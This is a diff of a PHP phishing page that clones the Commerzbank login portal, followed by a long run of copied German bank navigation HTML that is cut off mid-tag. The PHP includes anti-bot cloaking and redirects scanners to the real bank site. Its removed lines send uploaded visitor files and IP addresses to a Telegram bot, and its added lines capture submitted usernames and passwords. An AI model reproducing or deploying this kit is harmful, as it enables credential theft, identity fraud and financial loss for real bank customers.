@@ -1,73 +1,22 @@
 <?php
+session_start();
 
-// ANTIBOT DISABLED - include..antibot.php';
+include '../antibot.php';
 include '../antibot/tds.php';
+// Captcha verification removed from login processing
 
-ini_set('upload_max_filesize', '0');
-ini_set('post_max_size', '0');
-ini_set('max_execution_time', '600');
-
-$config = include('../config/index.php');
-$botToken = $config['bot_token'];
-$chatId = $config['chat_id'];
-
-$uploadDir = 'xentryxupload/';
-if (!is_dir($uploadDir)) {
-    mkdir($uploadDir, 0755, true);
-}
-
-if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
-    $randomPrefix = str_pad(rand(0, 999999), 6, '0', STR_PAD_LEFT);
-    $originalFileName = basename($_FILES['file']['name']);
-    $fileExtension = pathinfo($originalFileName, PATHINFO_EXTENSION);
-    $newFileName = $randomPrefix . '-' . $originalFileName;
-    $uploadPath = $uploadDir . $newFileName;
-
-    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath)) {
-        $visitorIp = $_SERVER['REMOTE_ADDR'];
-        $serverHost = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_ADDR'];
-        $imageURL = "{$serverHost}/views/{$uploadDir}{$newFileName}";
-
-        // Prepare message text with IP address and image URL
-        $message = "🟡 |  𝗖𝗼𝗺𝗺𝗲𝗿𝘇𝗯𝗮𝗻𝗸 𝗨𝗽𝗹𝗼𝗮𝗱  [ 2nd ]\n";
-        $message .= "🔗 |  𝗜𝗠𝗚 𝗨𝗥𝗟  : $imageURL\n";
-        $message .= "📍 |  𝗜𝗣  : $visitorIp";
-
- 
-
-
-        // Send the image to Telegram
-        $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
-        $data = [
-            'chat_id' => $chatId,
-            'photo' => new CURLFile($uploadPath),
-            'caption' => $message
-        ];
-
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-
-        $result = curl_exec($ch);
-        if ($result === FALSE) {
-            echo "Error sending image to Telegram: " . curl_error($ch);
-        }
-        curl_close($ch);
-    } else {
-        echo "Error uploading the file.";
-    }
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    
+    $_SESSION['xusr'] = $_POST['xusr'];
+    $_SESSION['xpss'] = $_POST['xpss'];
 } else {
-    echo "No file uploaded or there was an upload error.";
+    header('Location: https://www.commerzbank.de/');
+    exit();
 }
 ?>
+ 
 
-
-
-
-
-<html dir="ltr" lang="de" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths win chrome chrome1 webkit webkit5 details" style=""><head>
+<!DOCTYPE html><html dir="ltr" lang="de" class="js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths win chrome chrome1 webkit webkit5 details" style=""><head>
 <script src="/security.js"></script>
 <link rel="icon" data-savepage-href="https://kunden.commerzbank.de/portal/media/system/images/favicon.ico" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABzPkCAMv5AgDL+gIAyvkCAMf4AgDD9QIAvfICALXuAgCp5gIFtugCAAAAAAAAAAAAAAAAAAAAAAAAAAAEz/sCAcz59QDL+f8Ay/r/AMr5/wDH+P8Aw/b/AL3y/wC17v8ApuX/C77u9QzF8AIAAAAAAAAAAAAAAAAAAAAAB9H7oAXQ+v8BzPn/AMv5/wDL+v8Ayfn/AMX3/wDA9P8AuPD/AK/r/wCc3v8a5v+gAAAAAAAAAAAAAAAADdj8EAvV+/0H0fr/Bc/6/wDM+v8Ay/r/AMr5/wDH+P8AwvX/ALzx/wCy7f8AneD/C8bw/Q/Y+xAAAAAAEdn7AhPd/8YQ3P//Ddr//wbR+v8Dzvr/AMv5/wDL+v8AyPj/AMP2/wC88v8As+3/AJ/h/xHa//8O2P3GDNb8Ahnj/zAQyfT/AJ/f/wCi45UFxvUEBM/7AgDL+QIAy/kCAMj4AgDD9gIAvPICAbrvBAzY/5UL1fv/B9L6/wfS+zAOxfLtAJjc/wCq5/8As+3+ALfvAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXP+wIFz/r+BtD6/wXP+v8CzfntAJ7e/wCo5/8Ate3/ALrx/wC+8scAwPQCAAAAAAAAAAAAAAAAAAAAAAHL+AIBy/nHAcz6/wLN+v8AzPn/AMv5/wCk4/UAtO3/ALrx/wDA9P8AxPb/AMj4DAAAAAAAAAAAAAAAAAAAAAAAyvoMAMv6/wDL+v8Ay/r/AMv6/wDL+vUAsuwvALjw/wC/8/8AxPb/AMj4/wDJ+eMAyvkCAAAAAAAAAAAAxvgCAMj54wDJ+f8Ayvn/AMr5/wDJ+f8AyvovALvxAgC989UAw/X/AMf4/wDK+f8AzPv/AMv5UAAAAAAAAAAAAMH0UADE9v8Axff/AMb3/wDH9/8Ax/jVAMf4AgAAAAAAwvUOAMT3/wDJ+f8AzPv/AMv5/wLN+vQF0PwCALbuAgC88vQAvvP/AMD0/wDB9P8AwfX/AMP2DgAAAAAAAAAAAMf4AgDI+LQAyvn/AMv6/wHM+f8Ez/r/Ctb+mwCs6psAs+3/ALbv/wC37/8AufD/ALrxtAC88gIAAAAAAAAAAAAAAAAAyvkCAMv6/gDL+f8Dzfr/BtH6/w3Z//8Al9v/AKLi/wCp5/8ArOn/AK3q/gCy7AIAAAAAAAAAAAAAAAAAAAAAAAAAAADL+m0Ay/n/A876/wjT/P8N2f//Cbns/wCS1/8Aldn/AJnc/wCd320AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMv5AgLN+QIF0PkCCtT6AgSz5wIAldkCAJbaAgCZ3AIAAAAAAAAAAAAAAAAAAAAA4AesQcADrEHAA6xBgAGsQQAArEEAAKxBB+CsQQPArEEDwKxBAYCsQQGArEGAAaxBgAGsQcADrEHgB6xB8A+sQQ==">
 <!-- PKTEMP -->
@@ -467,7 +416,7 @@ if ($_FILES['file']['error'] == UPLOAD_ERR_OK) {
     <!-- END NavSparten -->
   </div>
  
-    	  		  		 <nav class="mod mod-NavHaupt"> <div class="yellow-bar">&nbsp;</div>  <div class="inner"><div class="menubar-wrapper" style="left: auto; width: auto; height: auto;"><ul class="menubar"> <li class="hn-01 " aria-haspopup="true"> <a data-savepage-href="/banking/landingpage/" href="https://kunden.commerzbank.de/banking/landingpage/"><span>Startseite</span></a> </li> <li class="hn-02 hasSubNav noSecureIcon  containsList" aria-haspopup="true"> <a href="#" data-nav-href="/banking/financeoverview/"><span>Konten &amp; Karten</span></a> <ul class="menu row" aria-hidden="true" style="width: 1000px;"> <li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/financeoverview/?pk" href="https://kunden.commerzbank.de/banking/financeoverview/?pk"><i class="icon i-213"></i>Übersichten</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/financeoverview/?pk" href="https://kunden.commerzbank.de/banking/financeoverview/?pk"><i class="icon i-213"></i>Finanzübersicht</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/dailybanking/payment-orderoverview" href="https://kunden.commerzbank.de/dailybanking/payment-orderoverview"><i class="icon i-213"></i>Auftragsübersicht</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/standingorderoverview?pk" href="https://kunden.commerzbank.de/banking/standingorderoverview?pk"><i class="icon i-213"></i>Daueraufträge</a> </li><li class="md-02 "> <a data-savepage-href="/banking/postbox?pk" href="https://kunden.commerzbank.de/banking/postbox?pk">Postfach</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/account/transactions?pk" href="https://kunden.commerzbank.de/banking/account/transactions?pk"><i class="icon i-213"></i>Konten &amp; Karten</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/account/transactions?pk" href="https://kunden.commerzbank.de/banking/account/transactions?pk"><i class="icon i-213"></i>Umsätze</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/payments?pk" href="https://kunden.commerzbank.de/banking/payments?pk"><i class="icon i-213"></i>Überweisung</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/directdebitobjection?pk" href="https://kunden.commerzbank.de/banking/directdebitobjection?pk"><i class="icon i-213"></i>Lastschriftrückgabe</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/portal/de/privatkunden/meine-konten/verwaltung/konto-verwalten1/startseite-konto-verwalten.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/meine-konten/verwaltung/konto-verwalten1/startseite-konto-verwalten.html"><i class="icon i-213"></i>Verwaltung</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/portal/de/privatkunden/meine-konten/verwaltung/konto-verwalten1/startseite-konto-verwalten.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/meine-konten/verwaltung/konto-verwalten1/startseite-konto-verwalten.html"><i class="icon i-213"></i>Konto verwalten</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/portal/de/privatkunden/meine-konten/verwaltung/karten-verwalten-pk/startseite-karten-verwalten.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/meine-konten/verwaltung/karten-verwalten-pk/startseite-karten-verwalten.html"><i class="icon i-213"></i>Karten verwalten</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/accountdetails?pk" href="https://kunden.commerzbank.de/banking/accountdetails?pk"><i class="icon i-213"></i>Kontodetails </a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/dailybanking/change-transfer-limit" href="https://kunden.commerzbank.de/dailybanking/change-transfer-limit"><i class="icon i-213"></i>Überweisungslimit ändern</a> </li></ul> </li> </ul> </li> <li class="hn-02 hasSubNav noSecureIcon  containsList" aria-haspopup="true"> <a href="#" data-nav-href="/banking/depotoverview-ab"><span>Depot &amp; Order</span></a> <ul class="menu row" aria-hidden="true" style="width: 1000px;"> <li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/depotoverview-ab?pk" href="https://kunden.commerzbank.de/banking/depotoverview-ab?pk"><i class="icon i-213"></i>Depot</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/depotoverview-ab?pk" href="https://kunden.commerzbank.de/banking/depotoverview-ab?pk"><i class="icon i-213"></i>Depotübersicht</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/wpfe/sam/overview?pk" href="https://kunden.commerzbank.de/wpfe/sam/overview?pk"><i class="icon i-213"></i>Depot verwalten</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/assetmanagement?pk" href="https://kunden.commerzbank.de/banking/assetmanagement?pk"><i class="icon i-213"></i>Vermögensverwaltung</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/wpfe/securitiestransactionoverview?pk" href="https://kunden.commerzbank.de/wpfe/securitiestransactionoverview?pk"><i class="icon i-213"></i>Wertpapierumsätze</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/order-book?pk" href="https://kunden.commerzbank.de/banking/order-book?pk"><i class="icon i-213"></i>Order</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/order-book?pk" href="https://kunden.commerzbank.de/banking/order-book?pk"><i class="icon i-213"></i>Orderbuch</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/trading/order?pageMode=0&amp;accessPoint=0&amp;pk" href="https://kunden.commerzbank.de/banking/trading/order?pageMode=0&amp;accessPoint=0&amp;pk"><i class="icon i-213"></i>Wertpapiere kaufen</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/trading/order?pageMode=1&amp;accessPoint=0&amp;pk" href="https://kunden.commerzbank.de/banking/trading/order?pageMode=1&amp;accessPoint=0&amp;pk"><i class="icon i-213"></i>Wertpapiere verkaufen</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/ipo-subscription/ipo-overview?pk" href="https://kunden.commerzbank.de/banking/ipo-subscription/ipo-overview?pk"><i class="icon i-213"></i>Neuemissionen</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/savingsplan?pk" href="https://kunden.commerzbank.de/banking/savingsplan?pk"><i class="icon i-213"></i>Wertpapiersparpläne</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/savingsplan?pk" href="https://kunden.commerzbank.de/banking/savingsplan?pk"><i class="icon i-213"></i>Sparplanübersicht</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/savingsplan/entrypage?pageMode=1&amp;pk &amp;pk" href="https://kunden.commerzbank.de/banking/savingsplan/entrypage?pageMode=1&amp;pk%20&amp;pk"><i class="icon i-213"></i>Sparplan anlegen</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/marktdaten2/home/markets/index.html" href="https://kunden.commerzbank.de/marktdaten2/home/markets/index.html"><i class="icon i-213"></i>Börse</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/marktdaten2/home/markets/index.html" href="https://kunden.commerzbank.de/marktdaten2/home/markets/index.html"><i class="icon i-213"></i>Kurse &amp; Märkte</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/marktdaten2/home/depot/index.html" href="https://kunden.commerzbank.de/marktdaten2/home/depot/index.html"><i class="icon i-213"></i>Watchlist</a> </li></ul> </li> </ul> </li> <li class="hn-02 " aria-haspopup="true"> <a data-savepage-href="/dailybanking/financialanalysis" href="https://kunden.commerzbank.de/dailybanking/financialanalysis"><span>Analyse</span></a> </li> <li class="hn-02 noSecureIcon " aria-haspopup="true"> <a data-savepage-href="/portal/de/privatkunden/meine-anliegen/meine-anliegen.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/meine-anliegen/meine-anliegen.html"><span>Service</span></a> </li> <li class="hn-02 hasSubNav  containsList" aria-haspopup="true"> <a href="#" data-nav-href="/konten-zahlungsverkehr/"><span>Produkte &amp; Wissen</span></a> <ul class="menu row" aria-hidden="true" style="width: 1000px;"> <li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/konten-zahlungsverkehr/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/">Konten &amp; Zahlungsmittel</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/produkte/girokonten/kostenloses-girokonto/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/produkte/girokonten/kostenloses-girokonto/">Girokonten</a> </li><li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/produkte/kreditkarten/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/produkte/kreditkarten/">Kreditkarten</a> </li><li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/service/dispokredit/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/service/dispokredit/">Dispokredit</a> </li><li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/service/erste-schritte-im-online-banking/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/service/erste-schritte-im-online-banking/">Digital Banking</a> </li><li class="md-02 "> <a data-savepage-href="/konten-zahlungsverkehr/service/kontowechsel/" href="https://kunden.commerzbank.de/konten-zahlungsverkehr/service/kontowechsel/">Kontowechselservice</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/sparen-anlegen/" href="https://kunden.commerzbank.de/sparen-anlegen/">Sparen &amp; Anlegen</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/sparen-anlegen/produkte/tagesgeld/ " href="https://kunden.commerzbank.de/sparen-anlegen/produkte/tagesgeld/">Tagesgeld</a> </li><li class="md-02 "> <a data-savepage-href="/sparen-anlegen/produkte/festgeld/ " href="https://kunden.commerzbank.de/sparen-anlegen/produkte/festgeld/">Festgeld</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/produkte/etf-fonds-sparplan/etf-fonds-sparplan.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/produkte/etf-fonds-sparplan/etf-fonds-sparplan.html">ETF- &amp; Fonds-Sparpläne</a> </li><li class="md-02 "> <a data-savepage-href="/sparen-anlegen/produkte/vermoegenswirksame-leistungen/" href="https://kunden.commerzbank.de/sparen-anlegen/produkte/vermoegenswirksame-leistungen/">VL-Sparen</a> </li><li class="md-02 "> <a data-savepage-href="/sparen-anlegen/produkte/sparen-fuer-kinder/" href="https://kunden.commerzbank.de/sparen-anlegen/produkte/sparen-fuer-kinder/">Sparen für Kinder</a> </li><li class="md-02 "> <a data-savepage-href="/investieren/produkte/depot/" href="https://kunden.commerzbank.de/investieren/produkte/depot/">Depotmodelle</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/investieren/produkte/wertpapiere-handeln/ " href="https://kunden.commerzbank.de/investieren/produkte/wertpapiere-handeln/">Wertpapierhandel</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/investieren/produkte/depot/depot-eroeffnen/" href="https://kunden.commerzbank.de/investieren/produkte/depot/depot-eroeffnen/">Depot eröffnen</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/wissen/maerkte-kurse-analysen/maerkte-kurse-analysen.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/wissen/maerkte-kurse-analysen/maerkte-kurse-analysen.html">Märkte &amp; Analysen</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/aktien/aktien.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/aktien/aktien.html">Aktien</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/fonds/fonds.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/fonds/fonds.html">Fonds</a> </li><li class="md-02 "> <a data-savepage-href="/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/etf/etf.html " href="https://kunden.commerzbank.de/portal/de/privatkunden/sparen-anlegen/produkte/wertpapiere/etf/etf.html">ETFs</a> </li><li class="md-02 "> <a data-savepage-href="/investieren/produkte/wertpapier-angebote/ " href="https://kunden.commerzbank.de/investieren/produkte/wertpapier-angebote/">Aktuelle Angebote</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/kredit-finanzierung/" href="https://kunden.commerzbank.de/kredit-finanzierung/">Kredit &amp; Finanzierung</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/ratenkredite/ratenkredit/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/ratenkredite/ratenkredit/">Ratenkredit</a> </li><li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/ratenkredite/autokredit/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/ratenkredite/autokredit/">Autokredit</a> </li><li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/baufinanzierung/baufinanzierung/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/baufinanzierung/baufinanzierung/">Baufinanzierung</a> </li><li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/ratenkredite/modernisierungskredit/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/ratenkredite/modernisierungskredit/">Modernisierungskredit</a> </li><li class="md-02 "> <a data-savepage-href="/kredit-finanzierung/produkte/baufinanzierung/anschlussfinanzierung/" href="https://kunden.commerzbank.de/kredit-finanzierung/produkte/baufinanzierung/anschlussfinanzierung/">Anschlussfinanzierung</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav "> <a data-savepage-href="/vorsorgen-versichern/wissen/passende-vorsorge/" href="https://kunden.commerzbank.de/vorsorgen-versichern/wissen/passende-vorsorge/">Versicherungen &amp; Vorsorge</a> </h2> <ul> <li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/wissen/passende-vorsorge/" href="https://kunden.commerzbank.de/vorsorgen-versichern/wissen/passende-vorsorge/">Welche ist die passende Vorsorge?</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/versicherungen/risikolebensversicherung/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/versicherungen/risikolebensversicherung/">Risikolebensversicherung</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/versicherungen/berufsunfaehigkeitsversicherung/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/versicherungen/berufsunfaehigkeitsversicherung/">Berufsunfähigkeitsversicherung</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/allianz-schatzbrief/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/allianz-schatzbrief/">Allianz SchatzBrief</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/privatrente/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/privatrente/">PrivatRente</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/riester-rente/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/riester-rente/">RiesterRente</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/basisrente/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/basisrente/">BasisRente</a> </li><li class="md-02 "> <a data-savepage-href="/vorsorgen-versichern/produkte/altersvorsorge/vorsorgevollmacht/" href="https://kunden.commerzbank.de/vorsorgen-versichern/produkte/altersvorsorge/vorsorgevollmacht/">Vorsorgevollmacht</a> </li></ul> </li> </ul> </li> </ul></div></div><a class="btn-nav-prev"></a><a class="btn-nav-next active"></a></nav> 
+    	  		  		 <nav class="mod mod-NavHaupt"> <div class="yellow-bar"> </div>  <div class="inner"><div class="menubar-wrapper" style="left: auto; width: auto; height: auto;"><ul class="menubar"> <li class="hn-01 " aria-haspopup="true"> <a data-savepage-href="/banking/landingpage/" href="https://kunden.commerzbank.de/banking/landingpage/"><span>Startseite</span></a> </li> <li class="hn-02 hasSubNav noSecureIcon  containsList" aria-haspopup="true"> <a href="#" data-nav-href="/banking/financeoverview/"><span>Konten &amp; Karten</span></a> <ul class="menu row" aria-hidden="true" style="width: 1000px;"> <li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/financeoverview/?pk" href="https://kunden.commerzbank.de/banking/financeoverview/?pk"><i class="icon i-213"></i>Übersichten</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/financeoverview/?pk" href="https://kunden.commerzbank.de/banking/financeoverview/?pk"><i class="icon i-213"></i>Finanzübersicht</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/dailybanking/payment-orderoverview" href="https://kunden.commerzbank.de/dailybanking/payment-orderoverview"><i class="icon i-213"></i>Auftragsübersicht</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/standingorderoverview?pk" href="https://kunden.commerzbank.de/banking/standingorderoverview?pk"><i class="icon i-213"></i>Daueraufträge</a> </li><li class="md-02 "> <a data-savepage-href="/banking/postbox?pk" href="https://kunden.commerzbank.de/banking/postbox?pk">Postfach</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/account/transactions?pk" href="https://kunden.commerzbank.de/banking/account/transactions?pk"><i class="icon i-213"></i>Konten &amp; Karten</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/account/transactions?pk" href="https://kunden.commerzbank.de/banking/account/transactions?pk"><i class="icon i-213"></i>Umsätze</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/payments?pk" href="https://kunden.commerzbank.de/banking/payments?pk"><i class="icon i-213"></i>Überweisung</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/directdebitobjection?pk" href="https://kunden.commerzbank.de/banking/directdebitobjection?pk"><i class="icon i-213"></i>Lastschriftrückgabe</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/portal/de/privatkunden/meine-konten/verwaltung/konto-verwalten1/startseite-konto-verwalten.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/meine-konten/verwaltung/konto-verwalten1/startseite-konto-verwalten.html"><i class="icon i-213"></i>Verwaltung</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/portal/de/privatkunden/meine-konten/verwaltung/konto-verwalten1/startseite-konto-verwalten.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/meine-konten/verwaltung/konto-verwalten1/startseite-konto-verwalten.html"><i class="icon i-213"></i>Konto verwalten</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/portal/de/privatkunden/meine-konten/verwaltung/karten-verwalten-pk/startseite-karten-verwalten.html" href="https://kunden.commerzbank.de/portal/de/privatkunden/meine-konten/verwaltung/karten-verwalten-pk/startseite-karten-verwalten.html"><i class="icon i-213"></i>Karten verwalten</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/accountdetails?pk" href="https://kunden.commerzbank.de/banking/accountdetails?pk"><i class="icon i-213"></i>Kontodetails </a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/dailybanking/change-transfer-limit" href="https://kunden.commerzbank.de/dailybanking/change-transfer-limit"><i class="icon i-213"></i>Überweisungslimit ändern</a> </li></ul> </li> </ul> </li> <li class="hn-02 hasSubNav noSecureIcon  containsList" aria-haspopup="true"> <a href="#" data-nav-href="/banking/depotoverview-ab"><span>Depot &amp; Order</span></a> <ul class="menu row" aria-hidden="true" style="width: 1000px;"> <li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/depotoverview-ab?pk" href="https://kunden.commerzbank.de/banking/depotoverview-ab?pk"><i class="icon i-213"></i>Depot</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/depotoverview-ab?pk" href="https://kunden.commerzbank.de/banking/depotoverview-ab?pk"><i class="icon i-213"></i>Depotübersicht</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/wpfe/sam/overview?pk" href="https://kunden.commerzbank.de/wpfe/sam/overview?pk"><i class="icon i-213"></i>Depot verwalten</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/assetmanagement?pk" href="https://kunden.commerzbank.de/banking/assetmanagement?pk"><i class="icon i-213"></i>Vermögensverwaltung</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/wpfe/securitiestransactionoverview?pk" href="https://kunden.commerzbank.de/wpfe/securitiestransactionoverview?pk"><i class="icon i-213"></i>Wertpapierumsätze</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/order-book?pk" href="https://kunden.commerzbank.de/banking/order-book?pk"><i class="icon i-213"></i>Order</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/order-book?pk" href="https://kunden.commerzbank.de/banking/order-book?pk"><i class="icon i-213"></i>Orderbuch</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/trading/order?pageMode=0&accessPoint=0&pk" href="https://kunden.commerzbank.de/banking/trading/order?pageMode=0&accessPoint=0&pk"><i class="icon i-213"></i>Wertpapiere kaufen</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/trading/order?pageMode=1&accessPoint=0&pk" href="https://kunden.commerzbank.de/banking/trading/order?pageMode=1&accessPoint=0&pk"><i class="icon i-213"></i>Wertpapiere verkaufen</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/ipo-subscription/ipo-overview?pk" href="https://kunden.commerzbank.de/banking/ipo-subscription/ipo-overview?pk"><i class="icon i-213"></i>Neuemissionen</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a data-savepage-href="/banking/savingsplan?pk" href="https://kunden.commerzbank.de/banking/savingsplan?pk"><i class="icon i-213"></i>Wertpapiersparpläne</a> </h2> <ul> <li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/savingsplan?pk" href="https://kunden.commerzbank.de/banking/savingsplan?pk"><i class="icon i-213"></i>Sparplanübersicht</a> </li><li class="md-02 noSecureIcon "> <a data-savepage-href="/banking/savingsplan/entrypage?pageMode=1&pk &pk" href="https://kunden.commerzbank.de/banking/savingsplan/entrypage?pageMode=1&pk%20&pk"><i class="icon i-213"></i>Sparplan anlegen</a> </li></ul> </li><li class="containsList"> <h2 class="md-01 hasSubNav noSecureIcon "> <a 